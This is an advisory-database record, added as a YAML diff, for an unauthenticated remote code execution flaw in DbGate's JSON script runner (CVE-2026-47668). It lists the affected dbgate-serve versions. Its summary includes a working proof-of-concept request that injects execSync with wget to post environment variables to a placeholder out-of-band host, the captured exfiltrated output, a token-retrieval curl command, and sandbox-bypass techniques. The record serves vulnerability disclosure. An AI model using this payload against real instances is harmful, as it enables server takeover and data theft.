@@ -1,0 +1,279 @@
+advisory_id: GHSA-8v3q-9vmx-36vc
+datasource_id: github_osv/GHSA-8v3q-9vmx-36vc
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-8v3q-9vmx-36vc/GHSA-8v3q-9vmx-36vc.json
+aliases:
+  - CVE-2026-47668
+summary: "DbGate: Unauthenticated Remote Code Execution via JSON Script Runner\n### Summary\n\
+  DbGate's JSON script runner (`POST /runners/start`) allows remote code execution via code\
+  \ injection in the `functionName` parameter of JSON script `assign` commands. The `functionName`\
+  \ value is interpolated directly into dynamically generated JavaScript source code via string\
+  \ concatenation. The generated code is then executed in a forked Node.js child process.\n\n\
+  ### Details\n#### Step 1: User Input Entry Point\n\n**File:** `packages/api/src/controllers/runners.js`\
+  \ - `start()` method\n\nThe `/runners/start` endpoint accepts a POST body containing a `script`\
+  \ object. When `script.type == 'json'`, the request follows a different code path than raw\
+  \ shell scripts:\n\n```javascript\nasync start({ script }, req) {\n    if (script.type ==\
+  \ 'json') {\n        if (!platformInfo.isElectron) {\n            if (!checkSecureDirectoriesInScript(script))\
+  \ {\n                return { errorMessage: 'Unallowed directories in script' };\n       \
+  \     }\n        }\n        logJsonRunnerScript(req, script);\n        const js = await jsonScriptToJavascript(script);\n\
+  \        return this.startCore(runid, scriptTemplate(js, false));\n    }\n```\nThis path skips:\n\
+  1. The `run-shell-script` permission check\n2. The `allowShellScripting` platform-level check\n\
+  \nThe only validation performed is `checkSecureDirectoriesInScript()`, which `props.fileName`\
+  \ values\n\n---\n\n#### Step 2: JSON-to-JavaScript Conversion (Injection Point)\n\n**File:**\
+  \ `packages/tools/src/ScriptWriter.ts` - `assignCore()` method\n\nThe JSON script's `commands`\
+  \ array contains objects with `type: \"assign\"`. The `assignCore` method generates JavaScript\
+  \ by direct string concatenation of user-controlled values:\n\n```typescript\nassignCore(variableName,\
+  \ functionName, props) {\n    this._put(`const ${variableName} = await ${functionName}(${JSON.stringify(props)});`);\n\
+  }\n```\n\nBoth `variableName` and `functionName` are attacker-controlled values taken directly\
+  \ from the JSON request body and interpolated into the generated JavaScript source code.\n\
+  \n---\n\n#### Step 3: Function Name Compilation\n\n**File:** `packages/tools/src/packageTools.ts`\
+  \ - `compileShellApiFunctionName()`\n\nBefore interpolation, `functionName` passes through\
+  \ this function:\n\n```typescript\nexport function compileShellApiFunctionName(functionName)\
+  \ {\n    const nsMatch = functionName.match(/^([^@]+)@([^@]+)/);\n    if (nsMatch) {\n   \
+  \     return `${_camelCase(nsMatch[2])}.shellApi.${nsMatch[1]}`;\n    }\n    return `dbgateApi.${functionName}`;\n\
+  }\n```\n\nAn attacker supplying `functionName: \"x;MALICIOUS_CODE;//\"` gets:\n```\ndbgateApi.x;MALICIOUS_CODE;//\n\
+  ```\n\nThis is syntactically valid JavaScript: `dbgateApi.x` evaluates (and is discarded),\
+  \ `MALICIOUS_CODE` executes, and `//` comments out the trailing `(${JSON.stringify(props)});`.\n\
+  \n---\n\n#### Step 4: Generated JavaScript Template\n\nThe complete generated script that\
+  \ gets executed:\n\n```javascript\nconst dbgateApi = require(process.env.DBGATE_API);\nrequire\
+  \ = null;\nasync function run() {\n    const x = await dbgateApi.x;process.mainModule.require('child_process').execSync('wget\
+  \ <attacker host>');//({});\n    await dbgateApi.finalizer.run();\n}\ndbgateApi.runScript(run);\n\
+  ```\n\n#### Step 5: Execution via child_process.fork()\n\n**File:** `packages/api/src/controllers/runners.js`\
+  \ - `startCore()` method\n\nThe generated JavaScript string is written to a temporary file\
+  \ and executed as a new Node.js process via `child_process.fork()`. This provides the attacker\
+  \ with a full Node.js runtime, including access to `process`, `child_process`, `fs`, `net`,\
+  \ and all other Node.js built-in modules.\n\nThe `require = null` sandbox can be bypassed\
+  \ via:\n- `process.mainModule.require()` - separate reference unaffected by the null assignment\n\
+  - `module.constructor._load()` - internal module loader, also unaffected\n---\n\n#### Additional\
+  \ Injection Points\n\nThe same unsanitised string interpolation pattern exists in:\n\n| Endpoint\
+  \ | Parameter | File |\n|----------|-----------|------|\n| `POST /runners/start` | `functionName`\
+  \ in assign commands | `ScriptWriter.ts` - `assignCore()` |\n| `POST /runners/start` | `variableName`\
+  \ in assign commands | `ScriptWriter.ts` - `assignCore()` |\n| `POST /runners/load-reader`\
+  \ | `functionName` parameter | `ScriptWriter.ts` - `loaderScriptTemplate` |\n\n### PoC\n```http\n\
+  POST /runners/start HTTP/1.1\nHost: <dbgate-instance>:3000\nAuthorization: Bearer <token>\n\
+  Content-Type: application/json\n\n{\n  \"script\": {\n    \"type\": \"json\",\n    \"commands\"\
+  : [\n      {\n        \"type\": \"assign\",\n        \"variableName\": \"x\",\n        \"\
+  functionName\": \"x;process.mainModule.require('child_process').execSync('wget --post-data\
+  \ \\\"$(env 2>1&)\\\" <out of band host>');//\",\n        \"props\": {}\n      }\n    ],\n\
+  \    \"packageNames\": []\n  }\n}\n```\n\nThe request to the out of band host was as follows:\n\
+  \n```http\nPOST / HTTP/1.1\nHost: <out of band host>\nUser-Agent: Wget/1.21.3\nAccept: */*\n\
+  Accept-Encoding: identity\nConnection: Keep-Alive\nContent-Type: application/x-www-form-urlencoded\n\
+  Content-Length: 251\n\nNODE_VERSION=22.22.2\nHOSTNAME=4714c7a7405f\nYARN_VERSION=1.22.22\n\
+  HOME=/root\nTERM=xterm\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\
+  DBGATE_API=/home/dbgate-docker/bundle.js\nPWD=/root/.dbgate/run/16c2e85a-8512-4a7e-8678-391637bbdc2c\n\
+  ```\n\n---\n\nA bearer token is required to reach the endpoint, but in what appears to be\
+  \ the default deployment, authentication is disabled. Authentication needs to be explicitly\
+  \ set via environment variables. If this has not been explicitly set, per the defaults, a\
+  \ token can be retrieved using:\n\n```bash\ncurl -sk -H \"Content-Type: application/json\"\
+  \   -d '{\"amoid\":\"none\"}'   <dbgate-instance>:3000/auth/login\n```\n\n### Impact\n\n|\
+  \ Scenario | Impact | CVSS Score | CVSS Vector | \n|----------|--------|--------|--------|\n\
+  | Anonymous auth mode (default deployment) (`authProvider: \"Anonymous\"`) | Unauthenticated\
+  \ RCE | 10.0 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H |\n| Authenticated deployment\
+  \ | Authenticated RCE - any user with API access |  9.9 | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H\
+  \ |\n\n### Timeline\n\n| Date | Event |\n|------|-------|\n| 2026-03-31 | Vulnerability discovered\
+  \ |\n| 2026-04-07 | Advisory report prepared and submitted to maintainer |\n| 2026-04-22 |\
+  \ Fix released (v7.1.9) |\n| 2026-04-24 | Maintainer acknowledgment |\n| 2026-05-20 | Public\
+  \ disclosure |\n\n### Acknowledgements\n\n- Discovery assisted by Neo from @ProjectDiscovery\n\
+  - Initial research direction inspired by @H0j3n — https://github.com/runZeroInc/nuclei-templates/blob/main/http/vulnerabilities/dbgate-unauth-rce.yaml"
+impacted_packages:
+  - purl: pkg:npm/dbgate-serve
+    affected_versions: vers:npm/<=7.1.8
+    fixed_versions: vers:npm/7.1.9
+    affected_packages:
+      - pkg:npm/dbgate-serve@4.1.1
+      - pkg:npm/dbgate-serve@4.7.4-alpha.15
+      - pkg:npm/dbgate-serve@4.7.4-alpha.16
+      - pkg:npm/dbgate-serve@4.7.4
+      - pkg:npm/dbgate-serve@4.8.0
+      - pkg:npm/dbgate-serve@4.8.1
+      - pkg:npm/dbgate-serve@4.8.2
+      - pkg:npm/dbgate-serve@4.8.3
+      - pkg:npm/dbgate-serve@4.8.4
+      - pkg:npm/dbgate-serve@4.8.5
+      - pkg:npm/dbgate-serve@4.8.6
+      - pkg:npm/dbgate-serve@4.8.7
+      - pkg:npm/dbgate-serve@4.8.8
+      - pkg:npm/dbgate-serve@5.0.0-alpha.1
+      - pkg:npm/dbgate-serve@5.0.0
+      - pkg:npm/dbgate-serve@5.0.1
+      - pkg:npm/dbgate-serve@5.0.2
+      - pkg:npm/dbgate-serve@5.0.3
+      - pkg:npm/dbgate-serve@5.0.4-alpha.2
+      - pkg:npm/dbgate-serve@5.0.4-alpha.7
+      - pkg:npm/dbgate-serve@5.0.4-alpha.8
+      - pkg:npm/dbgate-serve@5.0.4
+      - pkg:npm/dbgate-serve@5.0.5
+      - pkg:npm/dbgate-serve@5.0.6-alpha.2
+      - pkg:npm/dbgate-serve@5.0.6
+      - pkg:npm/dbgate-serve@5.0.7
+      - pkg:npm/dbgate-serve@5.0.8
+      - pkg:npm/dbgate-serve@5.0.9
+      - pkg:npm/dbgate-serve@5.1.0
+      - pkg:npm/dbgate-serve@5.1.1
+      - pkg:npm/dbgate-serve@5.1.2
+      - pkg:npm/dbgate-serve@5.1.3
+      - pkg:npm/dbgate-serve@5.1.4
+      - pkg:npm/dbgate-serve@5.1.5
+      - pkg:npm/dbgate-serve@5.1.6
+      - pkg:npm/dbgate-serve@5.1.7-alpha.13
+      - pkg:npm/dbgate-serve@5.1.7-alpha.14
+      - pkg:npm/dbgate-serve@5.2.0
+      - pkg:npm/dbgate-serve@5.2.1
+      - pkg:npm/dbgate-serve@5.2.2-alpha.11
+      - pkg:npm/dbgate-serve@5.2.2-alpha.12
+      - pkg:npm/dbgate-serve@5.2.2-alpha.13
+      - pkg:npm/dbgate-serve@5.2.2
+      - pkg:npm/dbgate-serve@5.2.3
+      - pkg:npm/dbgate-serve@5.2.4-alpha.1
+      - pkg:npm/dbgate-serve@5.2.4
+      - pkg:npm/dbgate-serve@5.2.5
+      - pkg:npm/dbgate-serve@5.2.6
+      - pkg:npm/dbgate-serve@5.2.7-alpha.1
+      - pkg:npm/dbgate-serve@5.2.7
+      - pkg:npm/dbgate-serve@5.2.8
+      - pkg:npm/dbgate-serve@5.2.9
+      - pkg:npm/dbgate-serve@5.3.0
+      - pkg:npm/dbgate-serve@5.3.1
+      - pkg:npm/dbgate-serve@5.3.3
+      - pkg:npm/dbgate-serve@5.3.4
+      - pkg:npm/dbgate-serve@5.4.0
+      - pkg:npm/dbgate-serve@5.4.1
+      - pkg:npm/dbgate-serve@5.4.2
+      - pkg:npm/dbgate-serve@5.4.3
+      - pkg:npm/dbgate-serve@5.4.4
+      - pkg:npm/dbgate-serve@5.4.5-alpha.3
+      - pkg:npm/dbgate-serve@5.4.5-alpha.4
+      - pkg:npm/dbgate-serve@5.4.5-alpha.5
+      - pkg:npm/dbgate-serve@5.5.1
+      - pkg:npm/dbgate-serve@5.5.2
+      - pkg:npm/dbgate-serve@5.5.3
+      - pkg:npm/dbgate-serve@5.5.4-alpha.1
+      - pkg:npm/dbgate-serve@5.5.4-alpha.2
+      - pkg:npm/dbgate-serve@5.5.4-alpha.3
+      - pkg:npm/dbgate-serve@5.5.4-alpha.4
+      - pkg:npm/dbgate-serve@5.5.4-alpha.7
+      - pkg:npm/dbgate-serve@5.5.4-alpha.8
+      - pkg:npm/dbgate-serve@5.5.4
+      - pkg:npm/dbgate-serve@5.5.5
+      - pkg:npm/dbgate-serve@5.5.6
+      - pkg:npm/dbgate-serve@5.5.7-alpha.16
+      - pkg:npm/dbgate-serve@5.5.7-alpha.25
+      - pkg:npm/dbgate-serve@5.5.7-alpha.26
+      - pkg:npm/dbgate-serve@5.5.7-alpha.27
+      - pkg:npm/dbgate-serve@5.5.7-alpha.28
+      - pkg:npm/dbgate-serve@5.5.7-alpha.29
+      - pkg:npm/dbgate-serve@5.5.7-alpha.32
+      - pkg:npm/dbgate-serve@5.5.7-alpha.33
+      - pkg:npm/dbgate-serve@5.5.7-alpha.44
+      - pkg:npm/dbgate-serve@5.5.7-alpha.45
+      - pkg:npm/dbgate-serve@5.5.7-alpha.47
+      - pkg:npm/dbgate-serve@5.5.7-alpha.48
+      - pkg:npm/dbgate-serve@5.5.7-alpha.50
+      - pkg:npm/dbgate-serve@5.5.7-alpha.51
+      - pkg:npm/dbgate-serve@5.5.7-alpha.52
+      - pkg:npm/dbgate-serve@5.5.7-alpha.53
+      - pkg:npm/dbgate-serve@5.5.7-alpha.60
+      - pkg:npm/dbgate-serve@5.5.7-alpha.68
+      - pkg:npm/dbgate-serve@6.0.0-alpha.1
+      - pkg:npm/dbgate-serve@6.0.0
+      - pkg:npm/dbgate-serve@6.1.0
+      - pkg:npm/dbgate-serve@6.1.1
+      - pkg:npm/dbgate-serve@6.1.2
+      - pkg:npm/dbgate-serve@6.1.3
+      - pkg:npm/dbgate-serve@6.1.4
+      - pkg:npm/dbgate-serve@6.1.5
+      - pkg:npm/dbgate-serve@6.1.6
+      - pkg:npm/dbgate-serve@6.2.0
+      - pkg:npm/dbgate-serve@6.2.1
+      - pkg:npm/dbgate-serve@6.3.0
+      - pkg:npm/dbgate-serve@6.3.2
+      - pkg:npm/dbgate-serve@6.3.3
+      - pkg:npm/dbgate-serve@6.4.0
+      - pkg:npm/dbgate-serve@6.4.1
+      - pkg:npm/dbgate-serve@6.4.2
+      - pkg:npm/dbgate-serve@6.4.3-alpha.1
+      - pkg:npm/dbgate-serve@6.5.0
+      - pkg:npm/dbgate-serve@6.5.1
+      - pkg:npm/dbgate-serve@6.5.2
+      - pkg:npm/dbgate-serve@6.5.3
+      - pkg:npm/dbgate-serve@6.5.4
+      - pkg:npm/dbgate-serve@6.5.5
+      - pkg:npm/dbgate-serve@6.5.6
+      - pkg:npm/dbgate-serve@6.6.0
+      - pkg:npm/dbgate-serve@6.6.1
+      - pkg:npm/dbgate-serve@6.6.2
+      - pkg:npm/dbgate-serve@6.6.3
+      - pkg:npm/dbgate-serve@6.6.4
+      - pkg:npm/dbgate-serve@6.6.5
+      - pkg:npm/dbgate-serve@6.6.6
+      - pkg:npm/dbgate-serve@6.6.7
+      - pkg:npm/dbgate-serve@6.6.8-alpha.8
+      - pkg:npm/dbgate-serve@6.6.8-alpha.9
+      - pkg:npm/dbgate-serve@6.6.8-alpha.10
+      - pkg:npm/dbgate-serve@6.6.8
+      - pkg:npm/dbgate-serve@6.6.9
+      - pkg:npm/dbgate-serve@6.6.10
+      - pkg:npm/dbgate-serve@6.6.11
+      - pkg:npm/dbgate-serve@6.6.12
+      - pkg:npm/dbgate-serve@6.7.0
+      - pkg:npm/dbgate-serve@6.7.1
+      - pkg:npm/dbgate-serve@6.7.2-alpha.1
+      - pkg:npm/dbgate-serve@6.7.2
+      - pkg:npm/dbgate-serve@6.7.3
+      - pkg:npm/dbgate-serve@6.8.0
+      - pkg:npm/dbgate-serve@6.8.1
+      - pkg:npm/dbgate-serve@6.8.2
+      - pkg:npm/dbgate-serve@7.0.0-alpha.10
+      - pkg:npm/dbgate-serve@7.0.0-alpha.12
+      - pkg:npm/dbgate-serve@7.0.0
+      - pkg:npm/dbgate-serve@7.0.1
+      - pkg:npm/dbgate-serve@7.0.2
+      - pkg:npm/dbgate-serve@7.0.3
+      - pkg:npm/dbgate-serve@7.0.4
+      - pkg:npm/dbgate-serve@7.0.6
+      - pkg:npm/dbgate-serve@7.1.0
+      - pkg:npm/dbgate-serve@7.1.1
+      - pkg:npm/dbgate-serve@7.1.2
+      - pkg:npm/dbgate-serve@7.1.3-alpha.1
+      - pkg:npm/dbgate-serve@7.1.3-alpha.2
+      - pkg:npm/dbgate-serve@7.1.3-alpha.3
+      - pkg:npm/dbgate-serve@7.1.3
+      - pkg:npm/dbgate-serve@7.1.4-alpha.1
+      - pkg:npm/dbgate-serve@7.1.4-alpha.2
+      - pkg:npm/dbgate-serve@7.1.4
+      - pkg:npm/dbgate-serve@7.1.5
+      - pkg:npm/dbgate-serve@7.1.6
+      - pkg:npm/dbgate-serve@7.1.8-alpha.7
+      - pkg:npm/dbgate-serve@7.1.8
+    fixed_packages:
+      - pkg:npm/dbgate-serve@7.1.9
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '10.0'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-8v3q-9vmx-36vc/GHSA-8v3q-9vmx-36vc.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-94
+  - CWE-20
+  - CWE-1188
+references:
+  - url: https://github.com/dbgate/dbgate
+    reference_type:
+    reference_id:
+  - url: https://github.com/dbgate/dbgate/releases/tag/v7.1.9
+    reference_type:
+    reference_id:
+  - url: https://github.com/dbgate/dbgate/security/advisories/GHSA-8v3q-9vmx-36vc
+    reference_type:
+    reference_id:
+  - url: https://github.com/runZeroInc/nuclei-templates/blob/main/http/vulnerabilities/dbgate-unauth-rce.yaml
+    reference_type:
+    reference_id:
+exploits: []
